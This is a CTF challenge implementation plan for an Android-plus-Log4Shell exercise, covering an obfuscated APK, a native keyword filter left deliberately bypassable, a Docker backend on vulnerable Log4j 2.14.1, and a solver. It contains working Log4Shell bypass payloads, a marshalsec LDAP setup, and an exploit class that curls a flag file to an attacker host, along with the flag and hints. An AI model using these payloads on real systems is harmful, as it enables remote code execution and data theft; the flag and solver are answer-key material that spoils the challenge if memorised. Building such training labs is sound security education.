# Log4Shell Multi-Stage Challenge - Detailed Implementation Plan

## Challenge Overview

| Field | Value |
|-------|-------|
| **Name** | Log4Droid |
| **Category** | Android + Reverse Engineering |
| **Difficulty** | Hard |
| **Stages** | 3 |
| **Flag** | `L3m0nCTF{l0g4j_m33ts_4ndr01d}` |
| **Points** | 500 |

---

## Challenge Description (For CTFd)

> *"SecureBank just released their new mobile banking app. Their security team claims it's protected by an advanced native filter that blocks all known Log4j attack patterns. We've obtained the APK and backend access. Can you find a way through their defenses?"*
>
> **Attachments**: `SecureBank.apk`  
> **Server**: `nc target.ctf.com 8080`

---

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        CHALLENGER                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              │ 1. Downloads APK
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     SecureBank.apk                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ Java Classes (Obfuscated)                                │   │
│  │  • ApiConfig.java      → XOR encrypted API URL          │   │
│  │  • MainActivity.java   → UI (red herring)               │   │
│  │  • FeedbackService.java → Uses NativeFilter             │   │
│  └─────────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ lib/arm64-v8a/libsecfilter.so                           │   │
│  │  • XOR encrypted blocklist (key: 0x42)                  │   │
│  │  • Blocks: jndi, ldap, rmi, lower, upper, env, java     │   │
│  │  • BYPASS: k8s, date NOT blocked!                       │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              │ 2. Finds API endpoint
                              │ 3. Crafts bypass payload
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Backend Server (Docker)                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ LogServer.java (Log4j 2.14.1)                           │   │
│  │  • Endpoint: POST /api/feedback                          │   │
│  │  • Logs user input with Log4j                           │   │
│  │  • Uses NativeSecurity.check() filter                   │   │
│  └─────────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ /flag.txt                                                │   │
│  │  L3m0nCTF{l0g4j_m33ts_4ndr01d}                          │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

---

## Stage 1: Android APK Reversing

### What Challengers Need to Find
1. **API Base URL**: Hidden in `ApiConfig.java`, XOR encrypted
2. **API Endpoint**: `/api/v2/support/feedback`
3. **Vulnerable Field**: `userAgent` is logged by Log4j
4. **Native Filter**: `libsecfilter.so` filters all inputs

### Implementation Details

#### ApiConfig.java (Obfuscated)
```java
package com.securebank.config;

public class ApiConfig {
    // XOR encrypted URL: "http://TARGET_IP:8080" with key 0x41
    private static final byte[] ENC_URL = {
        0x29, 0x35, 0x35, 0x31, 0x79, 0x6E, 0x6E,  // "http://"
        0x30, 0x2C, 0x2D, 0x2B, 0x2C, 0x2E,        // "target" (example)
        0x79, 0x69, 0x6F, 0x69, 0x6F               // ":8080"
    };
    
    private static final int KEY = 0x41;
    
    public static String getBaseUrl() {
        StringBuilder sb = new StringBuilder();
        for (byte b : ENC_URL) {
            sb.append((char)(b ^ KEY));
        }
        return sb.toString();
    }
    
    public static String getFeedbackEndpoint() {
        // Also encrypted to make it harder
        return decryptString(ENC_FEEDBACK_PATH);
    }
}
```

#### NativeFilter.java (JNI Wrapper)
```java
package com.securebank.security;

public class NativeFilter {
    static {
        System.loadLibrary("secfilter");
    }
    
    // Returns true if input contains blocked patterns
    public static native boolean check(String input);
}
```

#### FeedbackService.java
```java
package com.securebank.api;

import com.securebank.security.NativeFilter;

public class FeedbackService {
    public void submitFeedback(String userAgent, String message) {
        // Input passes through native filter first
        if (NativeFilter.check(userAgent) || NativeFilter.check(message)) {
            throw new SecurityException("Malicious input detected");
        }
        
        // Send to backend
        HttpClient.post(
            ApiConfig.getBaseUrl() + "/api/v2/support/feedback",
            new JSONObject()
                .put("userAgent", userAgent)  // <-- LOGGED BY LOG4J!
                .put("message", message)
        );
    }
}
```

---

## Stage 2: Native Library Reversing

### Existing Code Analysis
Your current `native_security.c` already has:
- XOR encryption with key `0x42`
- Blocked keywords: `jndi`, `ldap`, `rmi`, `lower`, `upper`, `env`, `java`, `ctx`, `::- `
- **BYPASS**: `k8s` and `date` are NOT blocked!

### The Bypass Payloads
```bash
# Using ${k8s:...} lookup (not filtered!)
${${k8s:NaN:-j}ndi:ldap://attacker:1389/Exploit}

# Using ${date:...} lookup (not filtered!)
${${date:'j'}ndi:ldap://attacker:1389/Exploit}
```

### Native Code Structure (What Ghidra Shows)
```
┌─────────────────────────────────────────────────────────────────┐
│ Java_NativeSecurity_check                                       │
├─────────────────────────────────────────────────────────────────┤
│ 1. GetStringUTFChars(input)                                     │
│ 2. Decrypt XOR-encrypted patterns (key 0x42)                    │
│    - k_jndi  → "jndi"                                           │
│    - k_ldap  → "ldap"                                           │
│    - k_rmi   → "rmi"                                            │
│    - ...etc                                                     │
│ 3. strstr() check for each pattern                              │
│ 4. Return 1 if blocked, 0 if allowed                            │
├─────────────────────────────────────────────────────────────────┤
│ MISSING PATTERNS (the vulnerability):                           │
│  - "k8s"  is NOT in the blocklist                               │
│  - "date" is NOT in the blocklist                               │
└─────────────────────────────────────────────────────────────────┘
```

---

## Stage 3: Log4Shell Exploitation

### Existing LogServer.java
Your current code already:
- Uses Log4j for logging
- Calls `NativeSecurity.check()` for filtering
- Logs unfiltered input (the vulnerability!)

### Full Exploit Chain

#### Step 1: Start Malicious LDAP Server
```bash
# Using marshalsec
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec && mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://ATTACKER:8888/#Exploit"
```

#### Step 2: Create Exploit Class
```java
// Exploit.java
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c", 
                "curl http://ATTACKER:9999/$(cat /flag.txt | base64)"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {}
    }
}
```
```bash
javac Exploit.java
python3 -m http.server 8888  # Serve the compiled class
```

#### Step 3: Start Callback Listener
```bash
nc -lvnp 9999
```

#### Step 4: Send Bypass Payload
```bash
# Using k8s bypass
curl -X POST http://TARGET:8080/api/v2/support/feedback \
  -H "Content-Type: application/json" \
  -d '{"userAgent":"${${k8s:NaN:-j}ndi:ldap://ATTACKER:1389/Exploit}"}'
```

#### Step 5: Receive Flag
```
Received: L3m0nCTF{l0g4j_m33ts_4ndr01d}
```

---

## File Structure

```
Log4Shell/
├── implementation_plan.md      # This file
├── dist/                       # For challengers
│   └── SecureBank.apk          # Android app to reverse
├── backend/                    # Docker backend
│   ├── Dockerfile
│   ├── docker-compose.yml
│   ├── LogServer.java
│   ├── NativeSecurity.java
│   ├── libsecurity.so
│   ├── flag.txt
│   └── log4j-core-2.14.1.jar
├── android-app/                # APK source (not distributed)
│   ├── app/src/main/java/
│   │   └── com/securebank/
│   │       ├── ApiConfig.java
│   │       ├── NativeFilter.java
│   │       └── FeedbackService.java
│   └── app/src/main/jniLibs/
│       ├── arm64-v8a/libsecfilter.so
│       └── x86_64/libsecfilter.so
├── native/                     # Native lib source
│   ├── native_security.c       # (existing)
│   └── Makefile
└── solver/                     # Internal solver
    ├── exploit.py
    └── Exploit.java
```

---

## Docker Backend Setup

### Dockerfile
```dockerfile
FROM openjdk:8-jdk-slim

# Install required tools
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy Log4j 2.14.1 (vulnerable version)
COPY log4j-core-2.14.1.jar /app/
COPY log4j-api-2.14.1.jar /app/

# Copy server code
COPY LogServer.java /app/
COPY NativeSecurity.java /app/
COPY libsecurity.so /app/

# Copy flag
COPY flag.txt /flag.txt
RUN chmod 444 /flag.txt

# Compile
RUN javac -cp ".:log4j-core-2.14.1.jar:log4j-api-2.14.1.jar" \
    LogServer.java NativeSecurity.java

# Set library path
ENV LD_LIBRARY_PATH=/app

EXPOSE 8080

CMD ["java", "-cp", ".:log4j-core-2.14.1.jar:log4j-api-2.14.1.jar", "LogServer"]
```

### docker-compose.yml
```yaml
version: '3.8'

services:
  log4droid:
    build: .
    container_name: log4droid_backend
    ports:
      - "8080:8080"
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 256M
```

---

## Development Checklist

### Phase 1: Native Library ✓ (Existing)
- [x] Create `native_security.c` with XOR-encrypted blocklist
- [x] Implement JNI function `check()`
- [x] Leave bypass (k8s, date not filtered)
- [ ] Compile for ARM64 and x86_64

### Phase 2: Android APK
- [ ] Create Android Studio project
- [ ] Add `ApiConfig.java` with encrypted URL
- [ ] Add `NativeFilter.java` JNI wrapper
- [ ] Add `FeedbackService.java` 
- [ ] Include native libs in APK
- [ ] Build and sign release APK
- [ ] Test APK opens in jadx

### Phase 3: Backend Server ✓ (Partially Existing)
- [x] Create `LogServer.java` with Log4j
- [x] Create `NativeSecurity.java` 
- [ ] Update to use HTTP server (not stdin)
- [ ] Create Dockerfile
- [ ] Test full exploit chain

### Phase 4: Testing
- [ ] Verify APK decompiles correctly in jadx
- [ ] Verify native lib opens in Ghidra
- [ ] Verify standard payloads are BLOCKED
- [ ] Verify bypass payload WORKS
- [ ] Verify flag is retrieved via RCE

---

## Solver Script (Internal)

```python
#!/usr/bin/env python3
"""Log4Droid Challenge Solver"""
import requests
import subprocess
import threading
import http.server
import socketserver

TARGET = "http://target:8080"
ATTACKER_IP = "YOUR_IP"

# The bypass payload
PAYLOAD = '${${k8s:NaN:-j}ndi:ldap://' + ATTACKER_IP + ':1389/Exploit}'

def send_payload():
    requests.post(f"{TARGET}/api/v2/support/feedback", json={
        "userAgent": PAYLOAD,
        "message": "test"
    })

def main():
    print("[*] Starting LDAP server...")
    # Start marshalsec in background
    
    print("[*] Hosting Exploit.class...")
    # Start HTTP server
    
    print(f"[*] Sending payload: {PAYLOAD}")
    send_payload()
    
    print("[*] Check your callback listener for the flag!")

if __name__ == "__main__":
    main()
```

---

## Hints for Different Skill Levels

| Hint Level | Hint Text |
|------------|-----------|
| **Hint 1** (50 pts) | "The app's security seems to filter more than needed... or does it?" |
| **Hint 2** (100 pts) | "Log4j supports many lookup types. Are they all blocked?" |
| **Hint 3** (150 pts) | "Check if ${k8s:...} or ${date:...} lookups are filtered" |
